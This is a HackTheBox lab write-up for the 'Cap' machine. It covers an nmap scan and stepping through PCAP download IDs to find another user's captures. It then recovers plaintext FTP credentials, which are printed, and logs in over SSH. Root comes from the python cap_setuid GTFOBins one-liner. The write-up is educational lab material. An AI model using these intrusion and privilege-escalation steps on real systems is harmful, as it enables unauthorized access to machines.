---
layout: page
title: Cap
description: Cap from HackTheBox.
img: 
importance: 4
category: HackTheBox
related_publications: false
---

<div class="row justify-content-sm-center">
    <div class="col-sm-8 mt-3 mt-md-0">
        {% include figure.liquid loading="eager" path="assets/img/cap/logo.png" title="HTB Cap Logo" class="img-fluid rounded z-depth-1" %}
    </div>
</div>

<br />
<h2>Link</h2>
<a href="https://app.hackthebox.com/machines/Cap">Room Link</a>

<br/>
<h2>Process</h2>

<br/>
Aye, matey.  Welcome to the Cap box.  We be diggin' for buried treasure...slash flags.

Let's run the nmap to get the list of open ports.

{% raw %}
```sh
┌─[us-free-1]─[10.10.14.56]─[biscottidiskette@htb-rm1ratln18]─[~/my_data/machines/cap]
└──╼ [★]$ nmap -sC -sV -O -A -oN nmap 10.10.10.245
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-01-11 02:30 CST
Nmap scan report for 10.10.10.245
Host is up (0.21s latency).
Not shown: 997 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 fa:80:a9:b2:ca:3b:88:69:a4:28:9e:39:0d:27:d5:75 (RSA)
|   256 96:d8:f8:e3:e8:f7:71:36:c5:49:d5:9d:b6:a4:c9:0c (ECDSA)
|_  256 3f:d0:ff:91:eb:3b:f6:e1:9f:2e:8d:de:b3:de:b2:18 (ED25519)
80/tcp open  http    gunicorn

<snip>

```
{% endraw %}

<br />
Navigate to the website on port 80 and view the landing page.

<div class="row justify-content-sm-center">
    <div class="col-sm mt-3 mt-md-0">
        {% include figure.liquid loading="eager" path="/assets/img/cap/landing.png" title="Website Landing Page" class="img-fluid rounded z-depth-1" %}
    </div>
</div>

<br />
Click on the hamburger button.

<div class="row justify-content-sm-center">
    <div class="col-sm-4 mt-3 mt-md-0">
        {% include figure.liquid loading="eager" path="/assets/img/cap/hamburger.png" title="Click the Hamburger Button" class="img-fluid rounded z-depth-1" %}
    </div>
</div>

<br />
Click on the Security Snapshot (5 second PCAP + Analysis) option.

<div class="row justify-content-sm-center">
    <div class="col-sm-8 mt-3 mt-md-0">
        {% include figure.liquid loading="eager" path="/assets/img/cap/downloadfive.png" title="Download the PCAP" class="img-fluid rounded z-depth-1" %}
    </div>
</div>

<br />
Note the number in the url.

<div class="row justify-content-sm-center">
    <div class="col-sm-8 mt-3 mt-md-0">
        {% include figure.liquid loading="eager" path="/assets/img/cap/numbernote.png" title="Number in URL" class="img-fluid rounded z-depth-1" %}
    </div>
</div>

<br />
Iterate down to zero all the stored pcaps downloading them as you go.

<div class="row justify-content-sm-center">
    <div class="col-sm-8 mt-3 mt-md-0">
        {% include figure.liquid loading="eager" path="/assets/img/cap/downloadzero.png" title="Download Zero" class="img-fluid rounded z-depth-1" %}
    </div>
</div>

<br />
Use Wireshark to open 0.pcap, or whatever you called the first pcap.

<div class="row justify-content-sm-center">
    <div class="col-sm mt-3 mt-md-0">
        {% include figure.liquid loading="eager" path="/assets/img/cap/open0pcap.png" title="Open 0.pcap" class="img-fluid rounded z-depth-1" %}
    </div>
</div>

<br />
Filter the pcap by the FTP protocol since it is a clear-text protocol.

<div class="row justify-content-sm-center">
    <div class="col-sm-8 mt-3 mt-md-0">
        {% include figure.liquid loading="eager" path="/assets/img/cap/filterftp.png" title="Filter by FTP" class="img-fluid rounded z-depth-1" %}
    </div>
</div>

<br />
Reviewing the Info section, retrieve the USER and the PASS openly from the clear-text.

<div class="row justify-content-sm-center">
    <div class="col-sm mt-3 mt-md-0">
        {% include figure.liquid loading="eager" path="/assets/img/cap/getcreds.png" title="Get the Creds" class="img-fluid rounded z-depth-1" %}
    </div>
</div>
{% raw %}
```
nathan:Buck3tH4TF0RM3!
```
{% endraw %}

<br />
Use the credentials to log into SSH.

{% raw %}
```bash
┌─[us-free-1]─[10.10.14.56]─[biscottidiskette@htb-rm1ratln18]─[~/my_data/machines/cap]
└──╼ [★]$ ssh nathan@10.10.10.245
The authenticity of host '10.10.10.245 (10.10.10.245)' can't be established.
ED25519 key fingerprint is SHA256:UDhIJpylePItP3qjtVVU+GnSyAZSr+mZKHzRoKcmLUI.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.10.10.245' (ED25519) to the list of known hosts.
nathan@10.10.10.245's password: 
Welcome to Ubuntu 20.04.2 LTS (GNU/Linux 5.4.0-80-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Sat Jan 11 09:11:29 UTC 2025

  System load:           0.0
  Usage of /:            36.7% of 8.73GB
  Memory usage:          35%
  Swap usage:            0%
  Processes:             231
  Users logged in:       1
  IPv4 address for eth0: 10.10.10.245
  IPv6 address for eth0: dead:beef::250:56ff:feb0:49ad

  => There are 4 zombie processes.


63 updates can be applied immediately.
42 of these updates are standard security updates.
To see these additional updates run: apt list --upgradable


The list of available updates is more than a week old.
To check for new updates run: sudo apt update
Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings


Last login: Sat Jan 11 09:11:18 2025 from 10.10.16.15
nathan@cap:~$
```
{% endraw %}

<br />
Get the user flag.

{% raw %}
```bash
nathan@cap:~$ cat user.txt
<redacted>
nathan@cap:~$ ifconfig
eth0: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
        inet 10.10.10.245  netmask 255.255.255.0  broadcast 10.10.10.255
        inet6 fe80::250:56ff:feb0:49ad  prefixlen 64  scopeid 0x20<link>
        inet6 dead:beef::250:56ff:feb0:49ad  prefixlen 64  scopeid 0x0<global>
        ether 00:50:56:b0:49:ad  txqueuelen 1000  (Ethernet)
        RX packets 331534  bytes 28482550 (28.4 MB)
        RX errors 0  dropped 916  overruns 0  frame 0
        TX packets 326787  bytes 56235823 (56.2 MB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

lo: flags=73<UP,LOOPBACK,RUNNING>  mtu 65536
        inet 127.0.0.1  netmask 255.0.0.0
        inet6 ::1  prefixlen 128  scopeid 0x10<host>
        loop  txqueuelen 1000  (Local Loopback)
        RX packets 12562  bytes 964800 (964.8 KB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 12562  bytes 964800 (964.8 KB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0
```
{% endraw %}

<br />
Download the <a href="https://github.com/peass-ng/PEASS-ng/releases/tag/20250110-31084f44">linpeas.sh</a> from the GitHub and transfer it to the victim machine.

<div class="row justify-content-sm-center">
    <div class="col-sm mt-3 mt-md-0">
        {% include figure.liquid loading="eager" path="/assets/img/cap/linpeas.png" title="Transfer the Linpeas.sh" class="img-fluid rounded z-depth-1" %}
    </div>
</div>

<br />
Change linpeas.sh to executable and run linpeas.sh.  Notice the python has cap_setuid capability.

{% raw %}
```bash
nathan@cap:/dev/shm$ chmod +x linpeas.sh
nathan@cap:/dev/shm$ ./linpeas.sh



                            ▄▄▄▄▄▄▄▄▄▄▄▄▄▄
                    ▄▄▄▄▄▄▄             ▄▄▄▄▄▄▄▄
             ▄▄▄▄▄▄▄      ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄  ▄▄▄▄
         ▄▄▄▄     ▄ ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄ ▄▄▄▄▄▄
         ▄    ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄
         ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄ ▄▄▄▄▄       ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄
         ▄▄▄▄▄▄▄▄▄▄▄          ▄▄▄▄▄▄               ▄▄▄▄▄▄ ▄
         ▄▄▄▄▄▄              ▄▄▄▄▄▄▄▄                 ▄▄▄▄ 
         ▄▄                  ▄▄▄ ▄▄▄▄▄                  ▄▄▄
         ▄▄                ▄▄▄▄▄▄▄▄▄▄▄▄                  ▄▄
         ▄            ▄▄ ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄   ▄▄
         ▄      ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄
         ▄▄▄▄▄▄▄▄▄▄▄▄▄▄                                ▄▄▄▄
         ▄▄▄▄▄  ▄▄▄▄▄                       ▄▄▄▄▄▄     ▄▄▄▄
         ▄▄▄▄   ▄▄▄▄▄                       ▄▄▄▄▄      ▄ ▄▄
         ▄▄▄▄▄  ▄▄▄▄▄        ▄▄▄▄▄▄▄        ▄▄▄▄▄     ▄▄▄▄▄
         ▄▄▄▄▄▄  ▄▄▄▄▄▄▄      ▄▄▄▄▄▄▄      ▄▄▄▄▄▄▄   ▄▄▄▄▄ 
          ▄▄▄▄▄▄▄▄▄▄▄▄▄▄        ▄          ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄ 
         ▄▄▄▄▄▄▄▄▄▄▄▄▄                       ▄▄▄▄▄▄▄▄▄▄▄▄▄▄
         ▄▄▄▄▄▄▄▄▄▄▄                         ▄▄▄▄▄▄▄▄▄▄▄▄▄▄
         ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄            ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄
          ▀▀▄▄▄   ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄ ▄▄▄▄▄▄▄▀▀▀▀▀▀
               ▀▀▀▄▄▄▄▄      ▄▄▄▄▄▄▄▄▄▄  ▄▄▄▄▄▄▀▀
                     ▀▀▀▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▀▀▀

<snip>

Files with capabilities (limited to 50):
/usr/bin/python3.8 = cap_setuid,cap_net_bind_service+eip
/usr/bin/ping = cap_net_raw+ep
/usr/bin/traceroute6.iputils = cap_net_raw+ep
/usr/bin/mtr-packet = cap_net_raw+ep
/usr/lib/x86_64-linux-gnu/gstreamer1.0/gstreamer-1.0/gst-ptp-helper = cap_net_bind_service,cap_net_admin+ep

<snip>
```
{% endraw %}

<br />
Check python in the <a href="https://gtfobins.github.io/gtfobins/python/">GTFOBins</a> and notice that there is a capabilities section.

<div class="row justify-content-sm-center">
    <div class="col-sm mt-3 mt-md-0">
        {% include figure.liquid loading="eager" path="/assets/img/cap/cap.png" title="GTFOBins for Python" class="img-fluid rounded z-depth-1" %}
    </div>
</div>

<br />
Execute the python indicated in the GTFOBins.

{% raw %}
```bash
nathan@cap:/dev/shm$ python3 -c 'import os; os.setuid(0); os.system("/bin/sh")'
# whoami
root
```
{% endraw %}

<br />
Get the root flag.

{% raw %}
```bash
# cat /root/root.txt
<redacted>
# ifconfig
eth0: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
        inet 10.10.10.245  netmask 255.255.255.0  broadcast 10.10.10.255
        inet6 fe80::250:56ff:feb0:49ad  prefixlen 64  scopeid 0x20<link>
        inet6 dead:beef::250:56ff:feb0:49ad  prefixlen 64  scopeid 0x0<global>
        ether 00:50:56:b0:49:ad  txqueuelen 1000  (Ethernet)
        RX packets 335563  bytes 28805716 (28.8 MB)
        RX errors 0  dropped 1009  overruns 0  frame 0
        TX packets 330694  bytes 56829914 (56.8 MB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

lo: flags=73<UP,LOOPBACK,RUNNING>  mtu 65536
        inet 127.0.0.1  netmask 255.0.0.0
        inet6 ::1  prefixlen 128  scopeid 0x10<host>
        loop  txqueuelen 1000  (Local Loopback)
        RX packets 13878  bytes 1066163 (1.0 MB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 13878  bytes 1066163 (1.0 MB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0
```
{% endraw %}

<br />
Thanks so much for reading!